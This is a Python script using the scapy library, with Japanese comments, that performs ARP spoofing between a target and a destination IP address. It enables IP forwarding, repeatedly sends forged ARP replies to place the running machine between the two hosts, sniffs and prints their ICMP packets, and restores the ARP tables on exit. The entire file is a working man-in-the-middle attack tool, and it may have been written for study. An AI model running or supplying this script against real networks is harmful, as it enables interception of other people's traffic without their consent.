#!/usr/bin/python3
# coding: UTF-8

import argparse
import sys
import time

from multiprocessing import Process
from scapy.all import Ether, ARP, send, sniff, srp1


def enable_ip_forward():
    ip_forward_path = '/proc/sys/net/ipv4/ip_forward'
    with open(ip_forward_path, 'w') as f:
        # sudo sysctl net.ipv4.ip_forward=1相当の処理
        f.write('1')

def get_mac_address(target_ip):
    response = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/
                    ARP(pdst=target_ip, op='who-has'),
                    timeout=3, verbose=0)
    if response:
        return response.src
    return None
        
def spoof(target_ip, destination_ip):
    target_mac = get_mac_address(target_ip)
    # デフォルトでhwsrcには送信元のMACアドレスが入るので未指定
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=destination_ip, op='is-at')
    send(arp_response, verbose=0)

def restore(target_ip, destination_ip):
    target_mac = get_mac_address(target_ip)
    destination_mac = get_mac_address(destination_ip)
    # 正しい送信元IPアドレスと送信元MACアドレスを指定
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, 
                       psrc=destination_ip, hwsrc=destination_mac, 
                       op='is-at')
    send(arp_response, count=5, verbose=0)

# sniff関数の引数に指定するコールバック関数
def print_packet(packet):
    packet.show()

def sniff_icmp():
    sniff(filter='icmp', prn=print_packet)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Sniffing ICMP by ARP spoofing')
    parser.add_argument('target', help='Target IP Address')
    parser.add_argument('destination', help='Destination IP Address')

    args = parser.parse_args()
    target = args.target
    destination = args.destination
    enable_ip_forward()
    try:
        sniff_process = Process(target=sniff_icmp)
        sniff_process.start()
        print('Start sniffing...')
        print('Start ARP spoofing...')
        while True:
            spoof(target, destination)
            spoof(destination, target)
            time.sleep(2)
    except KeyboardInterrupt:
        print('Restoring the network...')
        restore(target, destination)
        restore(destination, target)
